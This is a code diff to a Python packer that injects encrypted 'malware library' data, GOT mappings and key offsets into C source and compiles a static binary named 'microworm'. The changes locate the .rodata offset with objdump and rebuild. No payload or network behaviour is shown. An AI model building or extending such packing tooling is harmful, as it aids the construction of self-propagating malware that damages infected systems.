@@ -14,7 +14,7 @@ from random import randint
 ###
 # class to convert all information of a malware library into valid c-code that can be injected into the main.c-file
 class MaLibrary:
-    def __init__(self, name, got_mappings, data, data_length, entry_address, key, elf_offset_key="0x1a4"):
+    def __init__(self, name, got_mappings, data, data_length, entry_address, key, elf_offset_data="0x1a4", elf_offset_key="0x1a4"):
         self.name = name
         self.got_offsets = "{" + ", ".join([key for key in got_mappings]) + "}"
         self.got_targets = "{" + ", ".join([got_mappings[key] for key in got_mappings]) + "}"
@@ -23,6 +23,7 @@ class MaLibrary:
         self.data_length = data_length
         self.entry_offset = entry_address
         self.key = key
+        self.elf_offset_data = elf_offset_data
         self.elf_offset_key = elf_offset_key
 
     def setup_string(self):
@@ -43,7 +44,7 @@ class MaLibrary:
             lib->data_length = {self.name}_data_length;
             lib->entry_offset = {self.name}_entry_offset;
             lib->key = {self.name}_key;
-            lib->elf_offset_data = 0xb2008;
+            lib->elf_offset_data = {self.elf_offset_data};
             lib->elf_offset_key = {self.elf_offset_key};
         """
 
@@ -216,7 +217,7 @@ def pack(module):
     out = f"{dir_src}/microworm.c"
     outbinary = f"{dir_bin}/microworm"
     mainfile = open(f"{dir_src}/{main}", "r")
-    code = mainfile.read()
+    code_original = mainfile.read()
     mainfile.close()
 
     # define all the filenames
@@ -247,7 +248,7 @@ def pack(module):
     lib = MaLibrary(module, got_mappings, data, len(data)//4, entry, key)
 
     # prepare the code for compilation; insert the data for the MaLibraries
-    code = get_module_setup_code(code, lib)
+    code = get_module_setup_code(code_original, lib)
 
     # write the code to a file
     outfile = open(out, "w")
@@ -266,21 +267,28 @@ def pack(module):
         if hex(key) in line:
             # check for the address of the key and rebuild the program
             lib.elf_offset_key  = hex(int(line.strip().split(':')[0][2:], 16) + 2)
-            
-            # prepare the code for compilation; insert the data for the MaLibraries
-            code = get_module_setup_code(code, lib)
-
-            # write the code to a file
-            outfile = open(out, "w")
-            outfile.write(code)
-            outfile.close()
-
-            # compile the final program as a static executable, containing all the necessary code and data
-            bash(f"{gcc} -g -static -o {outbinary} {out}")   # TODO: remove -g later, just for testing
-
-            # print the file-info of the compiled binary
-            bash(f"file {outbinary}", verbose=True)
             break
+            
+    dump = bash(f"objdump -h {outbinary}")
+    for line in dump.split("\n"):
+        if ".rodata" in line:
+            # check for the address of the key and rebuild the program
+            lib.elf_offset_data  = hex(int(line.strip().split('  ')[-2], 16) + 8)
+            break
+    
+    # prepare the code for compilation; insert the data for the MaLibraries
+    code = get_module_setup_code(code_original, lib)
+
+    # write the code to a file
+    outfile = open(out, "w")
+    outfile.write(code)
+    outfile.close()
+
+    # compile the final program as a static executable, containing all the necessary code and data
+    bash(f"{gcc} -g -static -o {outbinary} {out}")   # TODO: remove -g later, just for testing
+
+    # print the file-info of the compiled binary
+    bash(f"file {outbinary}", verbose=True)
     
 
     return out
